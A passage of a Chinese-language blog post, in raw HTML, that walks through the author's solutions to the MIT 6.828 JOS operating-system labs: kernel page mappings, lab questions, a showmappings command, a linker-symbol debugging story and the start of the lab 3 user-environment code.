class="hljs-comment">// Use the physical memory that &#x27;bootstack&#x27; refers to as the kernel</span><br><span class="hljs-comment">// stack.  The kernel stack grows down from virtual address KSTACKTOP.</span><br><span class="hljs-comment">// We consider the entire range from [KSTACKTOP-PTSIZE, KSTACKTOP)</span><br><span class="hljs-comment">// to be the kernel stack, but break this into two pieces:</span><br><span class="hljs-comment">//     * [KSTACKTOP-KSTKSIZE, KSTACKTOP) -- backed by physical memory</span><br><span class="hljs-comment">//     * [KSTACKTOP-PTSIZE, KSTACKTOP-KSTKSIZE) -- not backed; so if</span><br><span class="hljs-comment">//       the kernel overflows its stack, it will fault rather than</span><br><span class="hljs-comment">//       overwrite memory.  Known as a &quot;guard page&quot;.</span><br><span class="hljs-comment">//     Permissions: kernel RW, user NONE</span><br><span class="hljs-comment">// Your code goes here:</span><br>boot_map_region(kern_pgdir, KSTACKTOP - KSTKSIZE, KSTKSIZE, <br>PADDR(bootstack), PTE_W);<br></code></pre></td></tr></table></figure><p>最后是建立内核空间的映射，将高虚拟地址处的内核映射到物理地址起始处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Map all of physical memory at KERNBASE.</span><br><span class="hljs-comment">// Ie.  the VA range [KERNBASE, 2^32) should map to</span><br><span class="hljs-comment">//      the PA range [0, 2^32 - KERNBASE)</span><br><span class="hljs-comment">// We might not have 2^32 - KERNBASE bytes of physical memory, but</span><br><span class="hljs-comment">// we just set up the mapping anyway.</span><br><span class="hljs-comment">// Permissions: kernel RW, user NONE</span><br><span class="hljs-comment">// Your code goes here:</span><br>boot_map_region(kern_pgdir, KERNBASE,<br>ROUNDUP(<span class="hljs-number">0xffffffff</span> - KERNBASE, PGSIZE), <br><span class="hljs-number">0</span>, PTE_W);<br></code></pre></td></tr></table></figure><p>完成这一切之后运行分数判断程序，全部通过，至此，lab2 的所有编程练习完美通过</p><p><img src="https://s2.loli.net/2022/03/15/IGJUqd92siweVzg.png" alt="image.png"></p><p>下面是习题 Time</p><blockquote><p><strong>Question</strong></p><ol><li><p>What entries (rows) in the page directory have been filled in at this point? What addresses do they map and where do they point? In other words, fill out this table as much as possible:</p><table><thead><tr><th>Entry</th><th>Base Virtual Address</th><th>Points to (logically):</th></tr></thead><tbody><tr><td>1023</td><td>?</td><td>Page table for top 4MB of phys memory</td></tr><tr><td>1022</td><td>?</td><td>?</td></tr><tr><td>.</td><td>?</td><td>?</td></tr><tr><td>.</td><td>?</td><td>?</td></tr><tr><td>.</td><td>?</td><td>?</td></tr><tr><td>2</td><td>0x00800000</td><td>?</td></tr><tr><td>1</td><td>0x00400000</td><td>?</td></tr><tr><td>0</td><td>0x00000000</td><td>[see next question]</td></tr></tbody></table><p><s>破题🐕都不做</s></p></li><li><p>We have placed the kernel and user environment in the same address space. Why will user programs not be able to read or write the kernel’s memory? What specific mechanisms protect the kernel memory?</p><p>由于页表项相关权限位的存在，导致用户进程（运行在 ring3）无法读写内核的内存空间，内存分页机制保护了内核内存</p></li><li><p>What is the maximum amount of physical memory that this operating system can support? Why?</p><p>操作系统最大可支持的物理内存应当为 4GB，这是一个 32 位长度的地址能够表示的范围上限</p></li><li><p>How much space overhead is there for managing memory, if we actually had the maximum amount of physical memory? How is this overhead broken down?</p><p>~~看不懂题目，摸了！~~对于页表结构而言，一个二级页表刚好能满载 4GB 空间，需要一张页目录表与 1024 张页表，总计 <code>4198400</code> 字节空间；对于 PageInfo 结构体数组而言，一个 PageInfo 结构体占用的空间为 8 字节（4 字节对齐），那么要管理 4GB 的空间总计需要 <code>1048576</code> 个 PageInfo 结构体，占据 <code>8388608</code> 字节的空间；两者总计消耗 0.29% 的内存空间，笔者认为这个开销还是挺小的</p></li><li><p>Revisit the page table setup in <code>kern/entry.S</code> and <code>kern/entrypgdir.c</code>. Immediately after we turn on paging, EIP is still a low number (a little over 1MB). At what point do we transition to running at an EIP above KERNBASE? What makes it possible for us to continue executing at a low EIP between when we enable paging and when we begin running at an EIP above KERNBASE? Why is this transition necessary?</p><p>因为在启用分页之后低 1MB 的线性空间仍然映射到低 1MB 的物理空间，因此此时仍能正常运行；在 <code>call i386_init</code> 时跳转到 <code>kern/init.c</code> 中的 <code>i386_init()</code> 函数，此时 eip 便位于内核虚拟地址空间中了；在页表中建立双重映射；因为在开启分页之后 eip 暂时还运行在低地址空间，因此要先有个临时的双重映射保证进入内核虚拟地址空间之前的正常运行</p></li></ol></blockquote><p>接下来是选做部分：MIT 6.828 的 Challenge</p><blockquote><p><em>Challenge!</em> We consumed many physical pages to hold the page tables for the KERNBASE mapping. Do a more space-efficient job using the PTE_PS (“Page Size”) bit in the page directory entries. This bit was <em>not</em> supported in the original 80386, but is supported on more recent x86 processors. You will therefore have to refer to <a href="https://pdos.csail.mit.edu/6.828/2018/readings/ia32/IA32-3A.pdf">Volume 3 of the current Intel manuals</a>. Make sure you design the kernel to use this optimization only on processors that support it!</p></blockquote><p>这个 challenge 的意思大概就是开启 4MB 的大页，这首先需要我们修改 Cr4 寄存器，设置 <strong>Page-Size Extensions</strong> 标志位为 1 后内存页的大小就从 4KB 变成了 4MB，还需要设置页表项的 <code>PTE_PS</code> 位，主要都是苦力活这里就先摸了（</p><p>下一个 Challenge，新增一个 <code>showmappings</code> 命令：</p><blockquote><p><em>Challenge!</em> Extend the JOS kernel monitor with commands to:</p><ul><li>Display in a useful and easy-to-read format all of the physical page mappings (or lack thereof) that apply to a particular range of virtual/linear addresses in the currently active address space. For example, you might enter <code>'showmappings 0x3000 0x5000'</code> to display the physical page mappings and corresponding permission bits that apply to the pages at virtual addresses 0x3000, 0x4000, and 0x5000.</li><li>Explicitly set, clear, or change the permissions of any mapping in the current address space.</li><li>Dump the contents of a range of memory given either a virtual or physical address range. Be sure the dump code behaves correctly when the range extends across page boundaries!</li><li>Do anything else that you think might be useful later for debugging the kernel. (There’s a good chance it will be!)</li></ul></blockquote><p>使用 strtol 将字符串转为数字后使用 <code>page_lookup()</code> 查阅页表后打印即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">mon_show_mapping</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br><span class="hljs-type">uintptr_t</span> vstart, vend;<br><span class="hljs-type">pte_t</span>*pte;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pp</span>;</span><br><br><span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">3</span>)<br>&#123;<br>cprintf(<span class="hljs-string">&quot;Usage: showmappings addr_start addr_end\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>vstart = strtol(argv[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>vend = strtol(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (vstart &gt; vend)<br>&#123;<br>cprintf(<span class="hljs-string">&quot;Invalid start or end address!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>cprintf(<span class="hljs-string">&quot;Virtual address\t\tPhysical Address\n&quot;</span>);<br><span class="hljs-keyword">for</span> (; vstart &lt;= vend; vstart += PGSIZE)<br>&#123;<br>cprintf(<span class="hljs-string">&quot;  %010p\t\t &quot;</span>, vstart);<br>pp = page_lookup(kern_pgdir, (<span class="hljs-type">void</span>*) vstart, &amp;pte);<br><span class="hljs-keyword">if</span> (!pte)<br>cprintf(<span class="hljs-string">&quot; Not mapped yet.\n&quot;</span>);<br><span class="hljs-keyword">else</span><br>cprintf(<span class="hljs-string">&quot;  %010p\n&quot;</span>, page2pa(pp));<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>效果如下所示</p><p><img src="https://s2.loli.net/2022/03/16/Zz7vt2aeMJlUGVD.png" alt="image.png"></p><h3 id="Address-Space-Layout-Alternatives">Address Space Layout Alternatives</h3><p>当前的 JOS 内存布局并非是唯一的一种，一个操作系统还能将内核映射在线性低地址空间、而将线性高地址空间给用户进程使用，但由于 x86的一种向后兼容模式——虚拟 8086 模式将处理器“硬连线”到线性地址空间底部，因此若内核映射到此处则完全不可用</p><p>虽然这可能比想象中困难，但我们仍然有能将内核映射到低线性地址空间的方案——允许用户进程直接访问整个地址空间，但仍将内核与各进程间分割开来</p><blockquote><p>笔者评价：闲得慌</p></blockquote><p>下面是三个<s>闲得慌</s>的 Challenge：</p><blockquote><p><em>Challenge!</em> Each user-level environment maps the kernel. Change JOS so that the kernel has its own page table and so that a user-level environment runs with a minimal number of kernel pages mapped. That is, each user-level environment maps just enough pages mapped so that the user-level environment can enter and leave the kernel correctly. You also have to come up with a plan for the kernel to read/write arguments to system calls.</p></blockquote><p>大概是给内核设置一个独立的页表，而<strong>用户进程仅保留必须用到的内核映射，例如内核入口点</strong>（比如说系统调用），笔者认为这个实现差不多是 KPTI 的思想，这里就不手抄一份 KPTI 了~~，用户进程还啥影子都没有，写个🐓~~</p><blockquote><p><em>Challenge!</em> Write up an outline of how a kernel could be designed to allow user environments unrestricted use of the full 4GB virtual and linear address space. Hint: do the previous challenge exercise first, which reduces the kernel to a few mappings in a user environment. Hint: the technique is sometimes known as “<em>follow the bouncing kernel</em>.” In your design, be sure to address exactly what has to happen when the processor transitions between kernel and user modes, and how the kernel would accomplish such transitions. Also describe how the kernel would access physical memory and I/O devices in this scheme, and how the kernel would access a user environment’s virtual address space during system calls and the like. Finally, think about and describe the advantages and disadvantages of such a scheme in terms of flexibility, performance, kernel complexity, and other factors you can think of.</p></blockquote><p>大概是设计与实现上面的方案，并确保自己明确其中的细节</p><blockquote><p><em>Challenge!</em> Since our JOS kernel’s memory management system only allocates and frees memory on page granularity, we do not have anything comparable to a general-purpose <code>malloc</code>/<code>free</code> facility that we can use within the kernel. This could be a problem if we want to support certain types of I/O devices that require <em>physically contiguous</em> buffers larger than 4KB in size, or if we want user-level environments, and not just the kernel, to be able to allocate and map 4MB <em>superpages</em> for maximum processor efficiency. (See the earlier challenge problem about PTE_PS.)</p><p>Generalize the kernel’s memory allocation system to support pages of a variety of power-of-two allocation unit sizes from 4KB up to some reasonable maximum of your choice. Be sure you have some way to divide larger allocation units into smaller ones on demand, and to coalesce multiple small allocation units back into larger units when possible. Think about the issues that might arise in such a system.</p></blockquote><p>完善内核内存管理系统，提供更大粒度与更小粒度的 allocator（比如说 buddy system + slub allocator），这里就不手抄一份 buddy system 和 slub allocator 了，笔者暂时也没有更好的内存分配方案</p><blockquote><p><s>👴是懒🐕👴自豪</s></p></blockquote><p>至此，lab2 全部完成</p><h1>0x03.Lab 3: User Environments</h1><p>在这一部分我们终于要迈入用户进程的世界，实现特权级的分离，并完成系统调用的编写以及一个用户进程的运行</p><p><strong>注意</strong>：本 lab 中 <code>environment</code> 与 <code>process</code> 代指同一事物——运行的进程的抽象体，6.828 在这里更多使用 environment 而不是 process 是为了指出 JOS environment 与 UNIX process 提供了不同的接口，且不提供相同的语义</p><p>首先是惯例地将 lab 3代码拉到本地</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git add .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -am <span class="hljs-string">&#x27;changes to lab2 after handin&#x27;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git pull</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab3 origin/lab3</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git merge lab2</span><br></code></pre></td></tr></table></figure><blockquote><p>这里笔者本想先跑一跑内核玩玩，但是遇到一个奇怪的问题：在分配页目录表地址空间后、建立映射时会 panic 掉，经笔者调试发现在 boot_alloc() 中初始化 nextfree 的值所指向的那张内存页上<strong>仍然存在着一些内核变量，即这并非是一个闲置的内存页</strong>，于是我们的指向页目录表的指针就被 memset 清零了…</p><p>为什么？让我们将目光放回 <code>boot_alloc()</code> 函数中，在我们初始化 nextfree 时使用的是一个外部引入的变量 <code>end</code> 对内存页进行向上对齐得到的地址，这里说是由链接器生成的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Initialize nextfree if this is the first time.</span><br><span class="hljs-comment">// &#x27;end&#x27; is a magic symbol automatically generated by the linker,</span><br><span class="hljs-comment">// which points to the end of the kernel&#x27;s bss segment:</span><br><span class="hljs-comment">// the first virtual address that the linker did *not* assign</span><br><span class="hljs-comment">// to any kernel code or global variables.</span><br><span class="hljs-keyword">if</span> (!nextfree) &#123;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> end[];<br>nextfree = ROUNDUP((<span class="hljs-type">char</span> *) end, PGSIZE);<br>&#125;<br></code></pre></td></tr></table></figure><p>**但经过笔者反编译内核文件、打印 end 变量信息发现，其并不指向 bss 的末尾，后面还有几个变量，且其刚好落在内存页对齐的地址…**这也是为什么 ROUNDUP 不能顺利拯救 nextfree 的原因，可能也是为什么之前没有出现该问题的原因：之前 end 不一定刚好落在内存页对齐的地址，向上对齐一个页自然就早已超出 bss 了，但是现在链接器恰好将其生成在了一个微妙的位置</p><p><img src="https://s2.loli.net/2022/03/16/FzLf8Z39beEkXrH.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/16/1YAmcNrF8h3iLTy.png" alt="image.png"></p><p>笔者甚至怀疑 end 可能之前甚至都不在 bss 段末尾，可能也不是链接器生成的“末尾变量”…但是一看 IDA 的反编译结果，<strong>好像确乎有个 end 在整个镜像的最末尾，但他又指回了那个位置尴尬的 end 变量</strong></p><p><img src="https://s2.loli.net/2022/03/16/qDMFGo9v83PAOpY.png" alt="image.png"></p><p>笔者暂且不知道是什么原因导致了这个现象的发生，目前的解决方案是在计算 nextfree 时多加一个 page 进行 ROUNDUP，<strong>但在后面的 check_kern_pgdir 里面又 panic 掉了…</strong></p><blockquote><p>lab2 跑得好好的 lab3 咋突然莫名其妙炸了，👴不理解</p></blockquote><p>于是笔者<strong>将 lab2 分支的 kern/pmap.c 拷贝过来，让 end 加上一个 page，内存管理这一块又一切正常了…</strong></p><blockquote><p>👴愿意称之为灵异事件</p></blockquote><p>那就只能是 lab3 中的一些改动把内存管理给 crash 掉了，笔者检索该函数的 panic 信息，发现确乎是在检查 lab3 新增的内存映射区域时 panic 的（这块内存我们还没映射）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// check envs array (new test for lab 3)</span><br>n = ROUNDUP(NENV*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Env), PGSIZE);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i += PGSIZE)<br>assert(check_va2pa(pgdir, UENVS + i) == PADDR(envs) + i);<br></code></pre></td></tr></table></figure><p>所以接下来重新开始 lab3 的旅程</p><blockquote><p>但👴觉得 end 确乎是对齐错了</p></blockquote></blockquote><p>在 lab3 中新增了以下文件：</p><table><thead><tr><th><code>inc/</code></th><th><code>env.h</code></th><th>Public definitions for user-mode environments</th></tr></thead><tbody><tr><td></td><td><code>trap.h</code></td><td>Public definitions for trap handling</td></tr><tr><td></td><td><code>syscall.h</code></td><td>Public definitions for system calls from user environments to the kernel</td></tr><tr><td></td><td><code>lib.h</code></td><td>Public definitions for the user-mode support library</td></tr><tr><td><code>kern/</code></td><td><code>env.h</code></td><td>Kernel-private definitions for user-mode environments</td></tr><tr><td></td><td><code>env.c</code></td><td>Kernel code implementing user-mode environments</td></tr><tr><td></td><td><code>trap.h</code></td><td>Kernel-private trap handling definitions</td></tr><tr><td></td><td><code>trap.c</code></td><td>Trap handling code</td></tr><tr><td></td><td><code>trapentry.S</code></td><td>Assembly-language trap handler entry-points</td></tr><tr><td></td><td><code>syscall.h</code></td><td>Kernel-private definitions for system call handling</td></tr><tr><td></td><td><code>syscall.c</code></td><td>System call implementation code</td></tr><tr><td><code>lib/</code></td><td><code>Makefrag</code></td><td>Makefile fragment to build user-mode library, <code>obj/lib/libjos.a</code></td></tr><tr><td></td><td><code>entry.S</code></td><td>Assembly-language entry-point for user environments</td></tr><tr><td></td><td><code>libmain.c</code></td><td>User-mode library setup code called from <code>entry.S</code></td></tr><tr><td></td><td><code>syscall.c</code></td><td>User-mode system call stub functions</td></tr><tr><td></td><td><code>console.c</code></td><td>User-mode implementations of <code>putchar</code> and <code>getchar</code>, providing console I/O</td></tr><tr><td></td><td><code>exit.c</code></td><td>User-mode implementation of <code>exit</code></td></tr><tr><td></td><td><code>panic.c</code></td><td>User-mode implementation of <code>panic</code></td></tr><tr><td><code>user/</code></td><td><code>*</code></td><td>Various test programs to check kernel lab 3 code</td></tr></tbody></table><h2 id="Part-A-User-Environments-and-Exception-Handling">Part A: User Environments and Exception Handling</h2><p>在新加入的头文件 <code>inc/env.h</code> 中包含了 JOS 的基本的用户环境定义，内核使用结构体 <code>Env</code> 来标识每一个用户环境，在本 lab 中我们需要完成 JOS 的多环境支持</p><p>在 <code>kern/env.c</code> 中，内核维护三个与环境有关的全局变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">envs</span> =</span> <span class="hljs-literal">NULL</span>;<span class="hljs-comment">// All environments</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">curenv</span> =</span> <span class="hljs-literal">NULL</span>;<span class="hljs-comment">// The current env</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">env_free_list</span>;</span><span class="hljs-comment">// Free environment list</span><br></code></pre></td></tr></table></figure><p>在 JOS 启动时会初始化一个长度为 <code>NENV</code> 的 <code>Env</code> 结构体数组，其中闲置的 Env 结构体链在 <code>env_free_list</code> 中，而 <code>curenv</code> 指向当前环境的 Env 结构体（类似于 Linux 内核中的 current() 指向 当前 CPU 上运行的进程的 task_struct），在启动阶段 curenv 为 NULL</p><blockquote><p>笔者认为还是叫进程好听，既然是同一个东西，没有必要为了和 UNIX 区分开来而特意改个莫名其妙的名字</p></blockquote><h3 id="Environment-State">Environment State</h3><p><code>Env</code> 结构体定义如下，笔者认为可以类比做 Linux 下的 <code>task_struct</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Trapframe</span> <span class="hljs-title">env_tf</span>;</span><span class="hljs-comment">// Saved registers</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">env_link</span>;</span><span class="hljs-comment">// Next free Env</span><br><span class="hljs-type">envid_t</span> env_id;<span class="hljs-comment">// Unique environment identifier</span><br><span class="hljs-type">envid_t</span> env_parent_id;<span class="hljs-comment">// env_id of this env&#x27;s parent</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">EnvType</span> <span class="hljs-title">env_type</span>;</span><span class="hljs-comment">// Indicates special system environments</span><br><span class="hljs-type">unsigned</span> env_status;<span class="hljs-comment">// Status of the environment</span><br><span class="hljs-type">uint32_t</span> env_runs;<span class="hljs-comment">// Number of times environment has run</span><br><br><span class="hljs-comment">// Address space</span><br><span class="hljs-type">pde_t</span> *env_pgdir;<span class="hljs-comment">// Kernel virtual address of page dir</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>各字段说明如下：</p><ul><li><p><strong>env_tf</strong>: 进程上下文中的寄存器状态</p></li><li><p><strong>env_link</strong>: 在 <code>env_free_list</code> 链表中指向下一个空闲 Env 结构体</p></li><li><p><strong>env_id</strong>: 唯一标识单个进程的 id，在 Env 结构体被重新分配后通常会发生改变</p></li><li><p><strong>env_parent_id</strong>: 父进程的 id</p></li><li><p><strong>env_type</strong>: 进程类型，对于大部分进程而言应当为 <code>ENV_TYPE_USER</code> 在后续的 lab 中会补充更多的为系统服务而出现的类型</p></li></ul><blockquote><p>用户进程与内核进程的既视感</p></blockquote><ul><li><p><strong>env_status</strong>: 进程状态，可选值范围如下：</p><ul><li><p><code>ENV_FREE</code>: 该 Env 结构体空闲</p></li><li><p><code>ENV_RUNNABLE</code>: 该 Env 结构体对应着一个等待运行的进程</p></li><li><p><code>ENV_RUNNING</code>: 该 Env 结构体对应着一个正在运行的进程</p></li><li><p><code>ENV_NOT_RUNNABLE</code>: 该 Env 结构体对应进程未准备好继续运行（例如在等待另一个进程的信号）</p></li><li><p><code>ENV_DYING</code>: 该 Env 结构体对应一个僵尸进程，我们将在 lab4 中用到它</p></li></ul></li><li><p><strong>env_pgdir</strong>: 进程页目录表</p></li></ul><p>需要注意的是，JOS 中的进程并没有自己的内核栈，同一时刻内只有一个进程可以处在内核态，所以 JOS 只需要一个单独的内核栈</p><h3 id="Allocating-the-Environments-Array">Allocating the Environments Array</h3><p>首先是一个小练习，在 <code>mem_init()</code> 中为 envs 数组分配空间</p><blockquote><p><strong>Exercise 1.</strong> Modify <code>mem_init()</code> in <code>kern/pmap.c</code> to allocate and map the <code>envs</code> array. This array consists of exactly <code>NENV</code> instances of the <code>Env</code> structure allocated much like how you allocated the <code>pages</code> array. Also like the <code>pages</code> array, the memory backing <code>envs</code> should also be mapped user read-only at <code>UENVS</code> (defined in <code>inc/memlayout.h</code>) so user processes can read from this array.</p><p>You should run your code and make sure <code>check_kern_pgdir()</code> succeeds.</p></blockquote><p>注意应在 <code>page_init()</code> 之前调用 <code>boot_alloc()</code> 分配空间，在这之后再进行映射，不要图省事写到一起</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Make &#x27;envs&#x27; point to an array of size &#x27;NENV&#x27; of &#x27;struct Env&#x27;.</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br>envs = boot_alloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Env) * NENV);<br><span class="hljs-built_in">memset</span>(envs, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Env) * NENV);<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Map the &#x27;envs&#x27; array read-only by the user at linear address UENVS</span><br><span class="hljs-comment">// (ie. perm = PTE_U | PTE_P).</span><br><span class="hljs-comment">// Permissions:</span><br><span class="hljs-comment">//    - the new image at UENVS  -- kernel R, user R</span><br><span class="hljs-comment">//    - envs itself -- kernel RW, user NONE</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br>boot_map_region(kern_pgdir, UENVS, <br>ROUNDUP(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Env) * NENV, PGSIZE), <br>PADDR(envs), PTE_U);<br></code></pre></td></tr></table></figure><h3 id="Creating-and-Running-Environments">Creating and Running Environments</h3><p>我们将在 <code>kern/env.c</code> 中编写运行用户环境所需的代码，因为目前还没有文件系统，所以目前临时的一个做法是将一个 ELF 文件以 raw 格式（链接内核时使用 <code>-b binary</code> 选项）嵌入到内核镜像中，这也是为什么我们能在内核符号文件 <code>obj/kern/kernel.sym</code> 中见到一些奇怪符号的缘故，这也是为什么实验一开始笔者反编译内核镜像见到奇怪的符号的缘故</p><p><img src="https://s2.loli.net/2022/03/16/w3GDsF2iCI1BVkd.png" alt="image.png"></p><p>在 <code>kern/init.c</code> 中的 <code>i386_init()</code> 中我们可以看到启动用户进程的代码，然而设置用户进程的代码尚未完工，这也是我们接下来需要完成的——Exercise2：</p><blockquote><p><strong>Exercise 2.</strong> In the file <code>env.c</code>, finish coding the following functions:</p><ul><li><p><code>env_init()</code></p><p>Initialize all of the <code>Env</code> structures in the <code>envs</code> array and add them to the <code>env_free_list</code>. Also calls <code>env_init_percpu</code>, which configures the segmentation hardware with separate segments for privilege level 0 (kernel) and privilege level 3 (user).</p></li><li><p><code>env_setup_vm()</code></p><p>Allocate a page directory for a new environment and initialize the kernel portion of the new environment’s address space.</p></li><li><p><code>region_alloc()</code></p><p>Allocates and maps physical memory for an environment</p></li><li><p><code>load_icode()</code></p><p>You will need to parse an ELF binary image, much like the boot loader already does, and load its contents into the user address space of a new environment.</p></li><li><p><code>env_create()</code></p><p>Allocate an environment with <code>env_alloc</code> and call <code>load_icode</code> to load an ELF binary into it.</p></li><li><p><code>env_run()</code></p><p>Start a given environment running in user mode.</p></li></ul><p>As you write these functions, you might find the new cprintf verb <code>%e</code> useful – it prints a description corresponding to an error code. For example,</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">r</span> = <span class="hljs-literal">-E_NO_MEM</span>;<br>panic(<span class="hljs-string">&quot;env_alloc: %e&quot;</span>, <span class="hljs-built_in">r</span>);<br></code></pre></td></tr></table></figure><p>will panic with the message “env_alloc: out of memory”.</p></blockquote><p>在开始之前，我们先看实验说明提供给我们的一个内核运行链：</p><ul><li><code>start</code> (<code>kern/entry.S</code>)</li><li><code>i386_init</code> (<code>kern/init.c</code>)<ul><li><code>cons_init</code></li><li><code>mem_init</code></li><li><code>env_init</code></li><li><code>trap_init</code> (still incomplete at this point)</li><li><code>env_create</code></li><li><code>env_run</code><ul><li><code>env_pop_tf</code></li></ul></li></ul></li></ul><p>现在开始补全实验代码。</p><h4 id="env-init-：初始化-Env-结构体，建立-freelist">env_init()：初始化 Env 结构体，建立 freelist</h4><p>首先看 <code>env_init()</code> 函数的注释，主要是将 envs 数组中所有 Env 结构体链到 <code>env_free_list</code> 上，并确保与数组相同的从前向后的连接顺序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Mark all environments in &#x27;envs&#x27; as free, set their env_ids to 0,</span><br><span class="hljs-comment">// and insert them into the env_free_list.</span><br><span class="hljs-comment">// Make sure the environments are in the free list in the same order</span><br><span class="hljs-comment">// they are in the envs array (i.e., so that the first call to</span><br><span class="hljs-comment">// env_alloc() returns envs[0]).</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>后向遍历 envs 数组建立单向链表即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 